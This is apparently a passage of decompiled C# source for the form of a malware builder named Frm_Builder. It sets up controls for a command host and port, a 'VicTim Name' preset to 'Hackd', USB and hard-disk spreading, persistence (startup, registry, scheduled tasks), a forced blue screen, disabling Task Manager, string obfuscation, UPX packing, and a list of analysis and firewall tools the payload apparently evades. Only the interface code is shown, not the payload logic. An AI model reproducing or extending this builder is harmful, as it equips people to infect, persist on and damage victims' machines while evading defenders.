			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox11 = value;
			}
		}

		internal virtual Label Label20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label20 = value;
			}
		}

		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		internal virtual CheckBox CH_Infect
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CH_Infect;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CH_Infect = value;
			}
		}

		internal virtual CheckBox Melt
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Melt;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Melt = value;
			}
		}

		internal virtual PictureBox PictureBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox4 = value;
			}
		}

		internal virtual CheckBox CH_p2p
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CH_p2p;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CH_p2p = value;
			}
		}

		internal virtual CheckBox CM_Yahoo
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CM_Yahoo;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CM_Yahoo = value;
			}
		}

		internal virtual Label Label23
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label23;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label23 = value;
			}
		}

		internal virtual Label Label22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label22 = value;
			}
		}

		internal virtual Label Label21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label21 = value;
			}
		}

		internal virtual LinkLabel LinkLabel6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel6_LinkClicked);
				bool flag = this._LinkLabel6 != null;
				if (flag)
				{
					this._LinkLabel6.LinkClicked -= value2;
				}
				this._LinkLabel6 = value;
				flag = (this._LinkLabel6 != null);
				if (flag)
				{
					this._LinkLabel6.LinkClicked += value2;
				}
			}
		}

		internal virtual LinkLabel LinkLabel5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel5_LinkClicked);
				bool flag = this._LinkLabel5 != null;
				if (flag)
				{
					this._LinkLabel5.LinkClicked -= value2;
				}
				this._LinkLabel5 = value;
				flag = (this._LinkLabel5 != null);
				if (flag)
				{
					this._LinkLabel5.LinkClicked += value2;
				}
			}
		}

		internal virtual LinkLabel LinkLabel4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel4_LinkClicked);
				bool flag = this._LinkLabel4 != null;
				if (flag)
				{
					this._LinkLabel4.LinkClicked -= value2;
				}
				this._LinkLabel4 = value;
				flag = (this._LinkLabel4 != null);
				if (flag)
				{
					this._LinkLabel4.LinkClicked += value2;
				}
			}
		}

		internal virtual LinkLabel LinkLabel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel3_LinkClicked);
				bool flag = this._LinkLabel3 != null;
				if (flag)
				{
					this._LinkLabel3.LinkClicked -= value2;
				}
				this._LinkLabel3 = value;
				flag = (this._LinkLabel3 != null);
				if (flag)
				{
					this._LinkLabel3.LinkClicked += value2;
				}
			}
		}

		internal virtual LinkLabel LinkLabel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel2_LinkClicked);
				bool flag = this._LinkLabel2 != null;
				if (flag)
				{
					this._LinkLabel2.LinkClicked -= value2;
				}
				this._LinkLabel2 = value;
				flag = (this._LinkLabel2 != null);
				if (flag)
				{
					this._LinkLabel2.LinkClicked += value2;
				}
			}
		}

		internal virtual LinkLabel LinkLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel1_LinkClicked);
				bool flag = this._LinkLabel1 != null;
				if (flag)
				{
					this._LinkLabel1.LinkClicked -= value2;
				}
				this._LinkLabel1 = value;
				flag = (this._LinkLabel1 != null);
				if (flag)
				{
					this._LinkLabel1.LinkClicked += value2;
				}
			}
		}

		internal virtual Label lbl_icones
		{
			[DebuggerNonUserCode]
			get
			{
				return this._lbl_icones;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._lbl_icones = value;
			}
		}

		internal virtual NYX_Button NyX_Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NyX_Button3_Click);
				bool flag = this._NyX_Button3 != null;
				if (flag)
				{
					this._NyX_Button3.Click -= value2;
				}
				this._NyX_Button3 = value;
				flag = (this._NyX_Button3 != null);
				if (flag)
				{
					this._NyX_Button3.Click += value2;
				}
			}
		}

		internal virtual NYX_Button NyX_Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NyX_Button2_Click);
				bool flag = this._NyX_Button2 != null;
				if (flag)
				{
					this._NyX_Button2.Click -= value2;
				}
				this._NyX_Button2 = value;
				flag = (this._NyX_Button2 != null);
				if (flag)
				{
					this._NyX_Button2.Click += value2;
				}
			}
		}

		internal virtual ComboBox dir
		{
			[DebuggerNonUserCode]
			get
			{
				return this._dir;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._dir = value;
			}
		}

		internal virtual TextBox exe
		{
			[DebuggerNonUserCode]
			get
			{
				return this._exe;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._exe = value;
			}
		}

		internal virtual Label Note
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Note;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Note = value;
			}
		}

		internal virtual CheckBox Anti_CH
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Anti_CH;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Anti_CH_CheckedChanged_1);
				bool flag = this._Anti_CH != null;
				if (flag)
				{
					this._Anti_CH.CheckedChanged -= value2;
				}
				this._Anti_CH = value;
				flag = (this._Anti_CH != null);
				if (flag)
				{
					this._Anti_CH.CheckedChanged += value2;
				}
			}
		}

		internal virtual TreeView Tree2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Tree2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Tree2 = value;
			}
		}

		internal virtual TreeView tree1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._tree1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._tree1 = value;
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox1_CheckedChanged);
				bool flag = this._CheckBox1 != null;
				if (flag)
				{
					this._CheckBox1.CheckedChanged -= value2;
				}
				this._CheckBox1 = value;
				flag = (this._CheckBox1 != null);
				if (flag)
				{
					this._CheckBox1.CheckedChanged += value2;
				}
			}
		}

		internal virtual TextBox TextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox2 = value;
			}
		}

		internal virtual CheckBox CheckBox12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox12 = value;
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click_1);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click_1);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				flag = (this._Button3 != null);
				if (flag)
				{
					this._Button3.Click += value2;
				}
			}
		}

		internal virtual CheckBox bsod
		{
			[DebuggerNonUserCode]
			get
			{
				return this._bsod;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._bsod = value;
			}
		}

		internal virtual CheckBox startup
		{
			[DebuggerNonUserCode]
			get
			{
				return this._startup;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._startup = value;
			}
		}

		internal virtual CheckBox reg99
		{
			[DebuggerNonUserCode]
			get
			{
				return this._reg99;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._reg99 = value;
			}
		}

		internal virtual CheckBox Del
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Del;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Del = value;
			}
		}

		internal virtual CheckBox CheckBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox4_CheckedChanged);
				bool flag = this._CheckBox4 != null;
				if (flag)
				{
					this._CheckBox4.CheckedChanged -= value2;
				}
				this._CheckBox4 = value;
				flag = (this._CheckBox4 != null);
				if (flag)
				{
					this._CheckBox4.CheckedChanged += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Builder.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Builder.__ENCList.Count == Frm_Builder.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Builder.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Builder.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Builder.__ENCList[num] = Frm_Builder.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Builder.__ENCList.RemoveRange(num, Frm_Builder.__ENCList.Count - num);
						Frm_Builder.__ENCList.Capacity = Frm_Builder.__ENCList.Count;
					}
					Frm_Builder.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Builder));
			TreeNode treeNode = new TreeNode("MS Config");
			TreeNode treeNode2 = new TreeNode("exeinfoPE");
			TreeNode treeNode3 = new TreeNode("NetSnifferCs");
			TreeNode treeNode4 = new TreeNode("Codereflect");
			TreeNode treeNode5 = new TreeNode("DNS Spy");
			TreeNode treeNode6 = new TreeNode("NET Reflector");
			TreeNode treeNode7 = new TreeNode("Spy The Spy");
			TreeNode treeNode8 = new TreeNode("Sandboxie");
			TreeNode treeNode9 = new TreeNode("Il Spy");
			TreeNode treeNode10 = new TreeNode("Reflector");
			TreeNode treeNode11 = new TreeNode("ByPass FireWall");
			TreeNode treeNode12 = new TreeNode("WireShark");
			TreeNode treeNode13 = new TreeNode("AppateDNS");
			TreeNode treeNode14 = new TreeNode("IP Blocker");
			TreeNode treeNode15 = new TreeNode("TiGer-FireWall");
			TreeNode treeNode16 = new TreeNode("Process Hacker");
			TreeNode treeNode17 = new TreeNode("Taskmgr");
			this.T1 = new TextBox();
			this.rnz = new CheckBox();
			this.US = new CheckBox();
			this.Label5 = new Label();
			this.Label4 = new Label();
			this.VN = new TextBox();
			this.Label3 = new Label();
			this.port = new NumericUpDown();
			this.host = new TextBox();
			this.Label2 = new Label();
			this.Label1 = new Label();
			this.CheckBox2 = new CheckBox();
			this.GroupBox3 = new GroupBox();
			this.GroupBox2 = new GroupBox();
			this.Label20 = new Label();
			this.Label6 = new Label();
			this.Anti = new CheckBox();
			this.Spre = new CheckBox();
			this.ty8 = new CheckBox();
			this.PictureBox3 = new PictureBox();
			this.GroupBox5 = new GroupBox();
			this.PictureBox2 = new PictureBox();
			this.GroupBox6 = new GroupBox();
			this.LinkLabel6 = new LinkLabel();
			this.LinkLabel5 = new LinkLabel();
			this.LinkLabel4 = new LinkLabel();
			this.LinkLabel3 = new LinkLabel();
			this.LinkLabel2 = new LinkLabel();
			this.LinkLabel1 = new LinkLabel();
			this.Label23 = new Label();
			this.Label22 = new Label();
			this.Label21 = new Label();
			this.CM_Yahoo = new CheckBox();
			this.CH_p2p = new CheckBox();
			this.Melt = new CheckBox();
			this.CH_Infect = new CheckBox();
			this.GroupBox7 = new GroupBox();
			this.NyX_Button3 = new NYX_Button();
			this.NyX_Button2 = new NYX_Button();
			this.lbl_icones = new Label();
			this.Label18 = new Label();
			this.CBIcones = new ComboBox();
			this.Button1 = new Button();
			this.LVIcones = new ListView();
			this.ColumnHeader2 = new ColumnHeader();
			this.ColumnHeader3 = new ColumnHeader();
			this.IM3 = new ImageList(this.components);
			this.Label17 = new Label();
			this.CBTamanhoICO = new ComboBox();
			this.TabControl1 = new TabControl();
			this.TabPage1 = new TabPage();
			this.GroupBox9 = new GroupBox();
			this.CheckBox4 = new CheckBox();
			this.bsod = new CheckBox();
			this.startup = new CheckBox();
			this.reg99 = new CheckBox();
			this.Del = new CheckBox();
			this.Button2 = new Button();
			this.Button3 = new Button();
			this.CheckBox12 = new CheckBox();
			this.TextBox2 = new TextBox();
			this.PictureBox1 = new PictureBox();
			this.CheckBox1 = new CheckBox();
			this.Tree2 = new TreeView();
			this.tree1 = new TreeView();
			this.dir = new ComboBox();
			this.exe = new TextBox();
			this.Label16 = new Label();
			this.Label15 = new Label();
			this.txt_port = new TextBox();
			this.txt_encription = new TextBox();
			this.TabPage2 = new TabPage();
			this.Label7 = new Label();
			this.TabPage3 = new TabPage();
			this.TabPage4 = new TabPage();
			this.GroupBox4 = new GroupBox();
			this.TextBox3 = new TextBox();
			this.Label14 = new Label();
			this.TextBox4 = new TextBox();
			this.Label13 = new Label();
			this.TextBox5 = new TextBox();
			this.Num8 = new NumericUpDown();
			this.TextBox6 = new TextBox();
			this.Num7 = new NumericUpDown();
			this.Label8 = new Label();
			this.Num6 = new NumericUpDown();
			this.Label9 = new Label();
			this.Num5 = new NumericUpDown();
			this.Label10 = new Label();
			this.Num4 = new NumericUpDown();
			this.Label11 = new Label();
			this.Num3 = new NumericUpDown();
			this.Label12 = new Label();
			this.Num2 = new NumericUpDown();
			this.Num1 = new NumericUpDown();
			this.TabPage8 = new TabPage();
			this.CheckBox3 = new CheckBox();
			this.GroupBox11 = new GroupBox();
			this.Label19 = new Label();
			this.CM_Obfs = new ComboBox();
			this.NumericUpDown1 = new NumericUpDown();
			this.txtStringOfuscador = new TextBox();
			this.Rpool = new NSRandomPool();
			this.TabPage5 = new TabPage();
			this.GroupBox1 = new GroupBox();
			this.TabPage6 = new TabPage();
			this.TabPage7 = new TabPage();
			this.PictureBox4 = new PictureBox();
			this.CKUpx = new CheckBox();
			this.NyX_Button1 = new NYX_Button();
			this.imm = new ImageList(this.components);
			this.NyX_Theme1 = new NYX_Theme();
			this.NyX_ControlBox1 = new NYX_ControlBox();
			this.NyX_ProgressBar1 = new NYX_ProgressBar();
			this.Anti_CH = new CheckBox();
			this.Note = new Label();
			((ISupportInitialize)this.port).BeginInit();
			this.GroupBox3.SuspendLayout();
			this.GroupBox2.SuspendLayout();
			((ISupportInitialize)this.PictureBox3).BeginInit();
			this.GroupBox5.SuspendLayout();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			this.GroupBox6.SuspendLayout();
			this.GroupBox7.SuspendLayout();
			this.TabControl1.SuspendLayout();
			this.TabPage1.SuspendLayout();
			this.GroupBox9.SuspendLayout();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.TabPage2.SuspendLayout();
			this.TabPage3.SuspendLayout();
			this.TabPage4.SuspendLayout();
			this.GroupBox4.SuspendLayout();
			((ISupportInitialize)this.Num8).BeginInit();
			((ISupportInitialize)this.Num7).BeginInit();
			((ISupportInitialize)this.Num6).BeginInit();
			((ISupportInitialize)this.Num5).BeginInit();
			((ISupportInitialize)this.Num4).BeginInit();
			((ISupportInitialize)this.Num3).BeginInit();
			((ISupportInitialize)this.Num2).BeginInit();
			((ISupportInitialize)this.Num1).BeginInit();
			this.TabPage8.SuspendLayout();
			this.GroupBox11.SuspendLayout();
			((ISupportInitialize)this.NumericUpDown1).BeginInit();
			this.TabPage5.SuspendLayout();
			this.TabPage6.SuspendLayout();
			this.TabPage7.SuspendLayout();
			((ISupportInitialize)this.PictureBox4).BeginInit();
			this.NyX_Theme1.SuspendLayout();
			this.SuspendLayout();
			this.T1.ForeColor = Color.Red;
			Control arg_813_0 = this.T1;
			Point location = new Point(830, 510);
			arg_813_0.Location = location;
			this.T1.Multiline = true;
			this.T1.Name = "T1";
			Control arg_84B_0 = this.T1;
			Size size = new Size(40, 20);
			arg_84B_0.Size = size;
			this.T1.TabIndex = 33;
			this.T1.Visible = false;
			this.rnz.AutoSize = true;
			Control arg_893_0 = this.rnz;
			location = new Point(809, 516);
			arg_893_0.Location = location;
			this.rnz.Name = "rnz";
			Control arg_8BE_0 = this.rnz;
			size = new Size(15, 14);
			arg_8BE_0.Size = size;
			this.rnz.TabIndex = 30;
			this.rnz.UseVisualStyleBackColor = true;
			this.rnz.Visible = false;
			this.US.AutoSize = true;
			this.US.BackColor = Color.Black;
			this.US.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.US.ForeColor = Color.White;
			Control arg_94D_0 = this.US;
			location = new Point(20, 67);
			arg_94D_0.Location = location;
			this.US.Name = "US";
			Control arg_978_0 = this.US;
			size = new Size(86, 17);
			arg_978_0.Size = size;
			this.US.TabIndex = 27;
			this.US.Text = "USB Spread";
			this.US.UseVisualStyleBackColor = false;
			this.Label5.AutoSize = true;
			this.Label5.BackColor = Color.Black;
			this.Label5.Font = new Font("Palatino Linotype", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label5.ForeColor = Color.Yellow;
			Control arg_A0B_0 = this.Label5;
			location = new Point(12, 35);
			arg_A0B_0.Location = location;
			this.Label5.Name = "Label5";
			Control arg_A36_0 = this.Label5;
			size = new Size(54, 16);
			arg_A36_0.Size = size;
			this.Label5.TabIndex = 25;
			this.Label5.Text = "Directory";
			this.Label4.AutoSize = true;
			this.Label4.BackColor = Color.Black;
			this.Label4.Font = new Font("Palatino Linotype", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label4.ForeColor = Color.Yellow;
			Control arg_ABC_0 = this.Label4;
			location = new Point(10, 75);
			arg_ABC_0.Location = location;
			this.Label4.Name = "Label4";
			Control arg_AE7_0 = this.Label4;
			size = new Size(56, 16);
			arg_AE7_0.Size = size;
			this.Label4.TabIndex = 23;
			this.Label4.Text = "ExeName";
			this.VN.BackColor = Color.Black;
			this.VN.BorderStyle = BorderStyle.FixedSingle;
			this.VN.ForeColor = Color.LightSteelBlue;
			Control arg_B4F_0 = this.VN;
			location = new Point(22, 111);
			arg_B4F_0.Location = location;
			this.VN.Name = "VN";
			Control arg_B7D_0 = this.VN;
			size = new Size(208, 21);
			arg_B7D_0.Size = size;
			this.VN.TabIndex = 22;
			this.VN.Text = "Hackd";
			this.Label3.AutoSize = true;
			this.Label3.BackColor = Color.Transparent;
			this.Label3.Font = new Font("Palatino Linotype", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label3.ForeColor = Color.LightSteelBlue;
			Control arg_C03_0 = this.Label3;
			location = new Point(19, 92);
			arg_C03_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_C2E_0 = this.Label3;
			size = new Size(78, 16);
			arg_C2E_0.Size = size;
			this.Label3.TabIndex = 21;
			this.Label3.Text = "VicTim Name";
			this.port.BackColor = Color.Black;
			this.port.BorderStyle = BorderStyle.FixedSingle;
			this.port.ForeColor = Color.LightSteelBlue;
			Control arg_C96_0 = this.port;
			location = new Point(55, 58);
			arg_C96_0.Location = location;
			NumericUpDown arg_CCE_0 = this.port;
			decimal num = new decimal(new int[]
			{
				10000,
				0,
				0,
				0
			});
			arg_CCE_0.Maximum = num;
			this.port.Name = "port";
			Control arg_CFC_0 = this.port;
			size = new Size(175, 21);
			arg_CFC_0.Size = size;
			this.port.TabIndex = 20;
			NumericUpDown arg_D42_0 = this.port;
			num = new decimal(new int[]
			{
				443,
				0,
				0,
				0
			});
			arg_D42_0.Value = num;
			this.host.BackColor = Color.Black;
			this.host.BorderStyle = BorderStyle.FixedSingle;
			this.host.ForeColor = Color.LightSteelBlue;
			Control arg_D8B_0 = this.host;
			location = new Point(22, 32);
			arg_D8B_0.Location = location;
			this.host.Name = "host";
			Control arg_DB9_0 = this.host;
			size = new Size(208, 21);
			arg_DB9_0.Size = size;
			this.host.TabIndex = 19;
			this.host.Text = "127.0.0.1";
			this.Label2.AutoSize = true;
			this.Label2.BackColor = Color.Transparent;
			this.Label2.Font = new Font("Palatino Linotype", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label2.ForeColor = Color.LightSteelBlue;
			Control arg_E3F_0 = this.Label2;
			location = new Point(19, 59);
			arg_E3F_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_E6A_0 = this.Label2;
			size = new Size(30, 16);
			arg_E6A_0.Size = size;
			this.Label2.TabIndex = 18;
			this.Label2.Text = "Port";
			this.Label1.AutoSize = true;
			this.Label1.BackColor = Color.Transparent;
			this.Label1.Font = new Font("Palatino Linotype", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label1.ForeColor = Color.LightSteelBlue;
			Control arg_EF0_0 = this.Label1;
			location = new Point(19, 13);
			arg_EF0_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_F1B_0 = this.Label1;
			size = new Size(32, 16);
			arg_F1B_0.Size = size;
			this.Label1.TabIndex = 17;
			this.Label1.Text = "Host";
			this.CheckBox2.AutoSize = true;
			this.CheckBox2.BackColor = Color.Black;
			this.CheckBox2.Checked = true;
			this.CheckBox2.CheckState = CheckState.Checked;
			this.CheckBox2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox2.ForeColor = Color.White;
			Control arg_FC1_0 = this.CheckBox2;
			location = new Point(593, 255);
			arg_FC1_0.Location = location;
			this.CheckBox2.Name = "CheckBox2";
			Control arg_FEC_0 = this.CheckBox2;
			size = new Size(82, 17);
			arg_FEC_0.Size = size;
			this.CheckBox2.TabIndex = 43;
			this.CheckBox2.Text = "Show Host";
			this.CheckBox2.UseVisualStyleBackColor = false;
			this.GroupBox3.BackColor = Color.Black;
			this.GroupBox3.Controls.Add(this.Label5);
			this.GroupBox3.Controls.Add(this.Label4);
			Control arg_1074_0 = this.GroupBox3;
			location = new Point(142, 100);
			arg_1074_0.Location = location;
			this.GroupBox3.Name = "GroupBox3";
			Control arg_10A2_0 = this.GroupBox3;
			size = new Size(382, 111);
			arg_10A2_0.Size = size;
			this.GroupBox3.TabIndex = 42;
			this.GroupBox3.TabStop = false;
			this.GroupBox2.BackColor = Color.Black;
			this.GroupBox2.Controls.Add(this.Label20);
			this.GroupBox2.Controls.Add(this.Label6);
			this.GroupBox2.Enabled = false;
			this.GroupBox2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.GroupBox2.ForeColor = Color.Lime;
			Control arg_1155_0 = this.GroupBox2;
			location = new Point(286, 28);
			arg_1155_0.Location = location;
			this.GroupBox2.Name = "GroupBox2";
			Control arg_1186_0 = this.GroupBox2;
			size = new Size(363, 191);
			arg_1186_0.Size = size;
			this.GroupBox2.TabIndex = 41;
			this.GroupBox2.TabStop = false;
			this.Label20.AutoSize = true;
			this.Label20.ForeColor = Color.White;
			Control arg_11D9_0 = this.Label20;
			location = new Point(10, 119);
			arg_11D9_0.Location = location;
			this.Label20.Name = "Label20";
			Control arg_1204_0 = this.Label20;
			size = new Size(34, 13);
			arg_1204_0.Size = size;
			this.Label20.TabIndex = 46;
			this.Label20.Text = "Body";
			this.Label6.AutoSize = true;
			this.Label6.ForeColor = Color.White;
			Control arg_125B_0 = this.Label6;
			location = new Point(10, 38);
			arg_125B_0.Location = location;
			this.Label6.Name = "Label6";
			Control arg_1286_0 = this.Label6;
			size = new Size(29, 13);
			arg_1286_0.Size = size;
			this.Label6.TabIndex = 44;
			this.Label6.Text = "Title";
			this.Anti.AutoSize = true;
			this.Anti.BackColor = Color.Black;
			this.Anti.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Anti.ForeColor = Color.White;
			Control arg_130F_0 = this.Anti;
			location = new Point(16, 128);
			arg_130F_0.Location = location;
			this.Anti.Name = "Anti";
			Control arg_133A_0 = this.Anti;
			size = new Size(95, 17);
			arg_133A_0.Size = size;
			this.Anti.TabIndex = 39;
			this.Anti.Text = "Anti Taskmgr";
			this.Anti.UseVisualStyleBackColor = false;
			this.Spre.AutoSize = true;
			this.Spre.BackColor = Color.Black;
			this.Spre.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Spre.ForeColor = Color.White;
			Control arg_13CD_0 = this.Spre;
			location = new Point(20, 109);
			arg_13CD_0.Location = location;
			this.Spre.Name = "Spre";
			Control arg_13F8_0 = this.Spre;
			size = new Size(115, 17);
			arg_13F8_0.Size = size;
			this.Spre.TabIndex = 40;
			this.Spre.Text = "Spread Hard Disk";
			this.Spre.UseVisualStyleBackColor = false;
			this.ty8.AutoSize = true;
			this.ty8.BackColor = Color.Black;
			this.ty8.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ty8.ForeColor = Color.White;
			Control arg_148E_0 = this.ty8;
			location = new Point(16, 157);
			arg_148E_0.Location = location;
			this.ty8.Name = "ty8";
			Control arg_14B9_0 = this.ty8;
			size = new Size(111, 17);
			arg_14B9_0.Size = size;
			this.ty8.TabIndex = 41;
			this.ty8.Text = "Scheduled Tasks";
			this.ty8.UseVisualStyleBackColor = false;
			this.PictureBox3.BackColor = Color.Black;
